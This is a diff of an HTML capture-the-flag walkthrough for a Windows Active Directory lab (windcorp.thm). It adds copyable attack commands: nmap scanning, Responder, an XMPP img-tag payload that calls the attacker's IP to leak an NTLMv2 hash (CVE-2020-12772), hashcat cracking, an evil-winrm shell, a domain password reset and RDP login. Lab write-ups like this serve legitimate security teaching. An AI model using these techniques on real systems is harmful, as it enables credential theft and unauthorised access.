@@ -68,7 +68,7 @@
                 <p>A large number of ports were open, so I performed a version scan to identify the running services.</p>
                 <img src="images/nmap2.png" class="lab-image zoomable">
                 <div class="command-wrapper">
-                    <pre><code data-copy-content="sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 ra.thm">└─$ sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 ra.thm</code></pre>
+                    <pre><code data-copy-content="sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 windcorp.thm">└─$ sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 windcorp.thm</code></pre>
                 </div>
                 <p>The main services identified were <b>Active Directory</b>, <b>Kerberos</b>, and <b>Openfire</b> (an XMPP server).</p>
             </section>
@@ -99,35 +99,47 @@
                 <img src="images/firstFlag.png" class="lab-image zoomable">
 
                 <p>Inside the share, I found multiple binaries for <b>Spark 2.8.3</b>, an XMPP client vulnerable to CVE-2020-12772.<br>
-                This vulnerability was discovered by the room authors.</p>
+                This vulnerability was discovered by the room authors. This likely indicates that the organization is using this version internally</p>
 
-                <p>I downloaded JDK 8 <a href="https://adoptium.net/temurin/releases?version=8&os=any&arch=any" target="_blank" class="link">here</a> and installed Spark 2.8.3.<br>
-                I then followed <a href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" class="link">this article</a> and started a <b>Responder</b> server on my VPN interface:</p>
-                
+                <p>I logged in using the xmpp account of <b>lilyle</b> with the new password.<br>
+                    Anyway, I then followed <a href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" class="link">this article</a> and started a <b>Responder</b> server on my VPN interface:</p>
                 <div class="command-wrapper">
-                <pre><code data-copy-content="sudo responder -I tun0">└─$ sudo responder -I tun0</code></pre>
+                    <pre><code data-copy-content="sudo responder -I tun0">└─$ sudo responder -I tun0</code></pre>
                 </div>
             </section>
 
             <section class="writeup-section">
                 <h2 class="section-title">Exploitation</h2>
-                <p>On port <b>80</b>, there was a list showing currently active users:</p>
+                <p>On port <b>80</b>, there was a list showing currently active XMPP users:</p>
                 <img src="images/onlineBuse.png" class="lab-image zoomable">
 
-                <p>Since <b>buse</b> was online, I sent the following message while Responder was running:</p>
+                <p>Since <b>buse</b> was online, I sent the following message to <b>buse@fire.windcorp.thm</b>. You have to add <b>fire.windcorp.thm</b> to <b>/etc/hosts</b> first.<br>
+                    And while Responder was running:</p>
                 <span class="path">&lt;img src="http://192.168.169.133/image.jpg"&gt;</span>
-                <p>Within seconds, I captured an NTLM hash:</p>
+                <p>Within seconds, I captured an NTLMv2 hash:</p>
                 <img src="images/NTLMhash.png" class="lab-image zoomable">
 
                 <p>I cracked the hash using Hashcat on my host machine:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="hashcat -m 5600 -a 0 hash.txt rockyou.txt">└─$ hashcat -m 5600 -a 0 hash.txt rockyou.txt</code></pre>
+                </div>
+                <p>And extracted the cracked password using:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="hashcat -m 5600 hash.txt --show">└─$ hashcat -m 5600 hash.txt --show</code></pre>
+                </div>
+
                 <img src="images/crackedHash.png" class="lab-image zoomable">
 
                 <p>Using <b>evil-winrm</b>, I obtained a shell as <b>buse</b> with the cracked credentials and retrieved the second flag:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="evil-winrm -i windcorp.thm -u buse -p PASSWORD_HERE">└─$ evil-winrm -i windcorp.thm -u buse -p PASSWORD_HERE</code></pre>
+                </div>
                 <img src="images/secondFlag.png" class="lab-image zoomable">
 
-                <p>While enumerating the system, I found a <b>scripts</b> directory in <b>C:\</b> containing a PowerShell script named <b>checkservers.ps1</b>.<br>
-                The script reads from <b>C:\Users\brittanycr\hosts.txt</b>.<br>
-                Although I could not access this file as the current user, I was able to reset <b>brittanycr</b>'s password and add her to the <b>Remote Management Users</b> group:</p>
+                <p>While enumerating the system, I found the <b>C:\scripts</b> directory containing a PowerShell script named <b>checkservers.ps1</b>.<br>
+                <b>checkservers.ps1</b> is being executed by an administative process<br>
+                The script reads from <b>C:\Users\brittanycr\hosts.txt</b> and executes everything that's in there.<br>
+                Although I could not access this file as the current user (buse), I was able to reset <b>brittanycr</b>'s password and add her to the <b>Remote Management Users</b> group:</p>
 
                 <div class="command-wrapper">
                     <pre><code data-copy-content="net user brittanycr Pass123! /domain">net user brittanycr Pass123! /domain</code></pre>
@@ -158,13 +170,15 @@
                 <div class="command-wrapper">
                     <pre><code data-copy-content="xfreerdp /u:brittanycr /p:Pass123! /v:windcorp.thm /cert:ignore">└─$ xfreerdp /u:brittanycr /p:Pass123! /v:windcorp.thm /cert:ignore</code></pre>
                 </div>
+            </section>
 
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
                 <p>Finally, I navigated to <b>C:\Users\Administrator\Desktop</b> and retrieved <b>Flag3.txt</b>:</p>
                 <img src="images/lastFlag.png" class="lab-image zoomable">
 
                 <br><br>
                 <p>That's it, we got the last flag. Thanks for reading! I hope you learned something new.</p>
-            </section>
         </article>
     </main>
     
